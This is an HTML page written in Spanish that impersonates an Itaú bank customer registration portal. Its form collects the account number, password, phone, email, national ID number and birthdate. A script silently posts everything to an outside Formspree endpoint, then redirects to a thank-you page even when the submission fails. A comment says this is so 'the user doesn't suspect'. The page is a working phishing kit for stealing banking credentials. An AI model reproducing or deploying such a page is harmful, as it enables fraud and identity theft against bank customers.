<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal - Registro de Cliente</title>
    <style>
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #FF6F00;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: transparent;
            width: 380px;
            padding: 40px;
            text-align: center;
            box-sizing: border-box;
        }
        .emblema {
            background-color: #FF6B00;
            width: 65px;
            height: 65px;
            border-radius: 16px;
            display: inline-flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 20px;
        }
        .emblema span {
            color: #FF6F00;
            font-size: 1.6rem;
            font-weight: bold;
        }
        h2 {
            color: #000000;
            margin: 0 0 10px 0;
            font-size: 1.8rem;
            font-weight: bold;
        }
        p {
            color: #000000;
            margin: 0 0 30px 0;
            font-size: 0.95rem;
            font-weight: bold;
        }
        form {
            text-align: left;
        }
        label {
            display: block;
            color: #000000;
            font-size: 0.9rem;
            font-weight: bold;
            margin-bottom: 6px;
            margin-top: 12px;
        }
        input[type="text"], input[type="password"], input[type="number"], input[type="date"], input[type="tel"], input[type="email"] {
        width: 100%;
        padding: 10px;
        border: 1px solid #CBD5E0;
        border-radius: 6px;
        box-sizing: border-box;
        color: #000000;
        font-size: 0.9rem;
        }
        input[type="submit"] {
            width: 100%;
            background-color: #000000;
            color: #FFFFFF;
            font-size: 0.9rem;
            font-weight: bold;
            padding: 12px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 25px;
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="emblema">
            <span>Itaú</span>
        </div>
        
        <h2>BIENVENIDO A ITAU</h2>
        <p>Registro de Cliente</p>

        <!-- 1. Modificamos el formulario agregándole un ID y quitando el action directo -->
<form id="miFormulario" method="POST">

  <label for="account">CTA</label>
  <input type="text" id="account" name="CTA" required>

  <label for="password">Password.</label>
  <input type="password" id="password" name="Password" required>

    <label for="phone">Teléfono</label>
<input type="tel" id="phone" name="phone" required>

<label for="email">Correo Electrónico</label>
<input type="email" id="email" name="email" required>

  <label for="ci">CI</label>
  <input type="text" id="ci" name="CI." required>

  <label for="birthdate">Fecha Nacimiento</label>
  <input type="date" id="birthdate" name="Fecha Nacimiento" required>

  <label for="age">Edad</label>
  <input type="number" id="age" name="Edad" min="19" max="120" required>

  <input type="submit" value="Enviar Datos"> 

</form>

<!-- 2. Script de JavaScript que procesa el envío en silencio y redirige a la fuerza -->
<script>
  document.getElementById("miFormulario").addEventListener("submit", function(event) {
    event.preventDefault(); // Evita que la página se recargue o vaya a la pantalla gris de Formspree
    
    var formData = new FormData(this);
    
    // Enviamos los datos a Formspree de manera interna
    fetch("https://formspree.io/f/mpqvglal", {
      method: "POST",
      body: formData,
      headers: {
        'Accept': 'application/json'
      }
    }).then(function(response) {
      // No importa si Formspree acepta el envío o da error por sus filtros,
      // obligamos al navegador a ir a tu pantalla de gracias inmediatamente.
      window.location.href = "gracias.html";
    }).catch(function(error) {
      // En caso de falla de red, también redirige para que el usuario no sospeche
      window.location.href = "gracias.html";
    });
  });
</script>
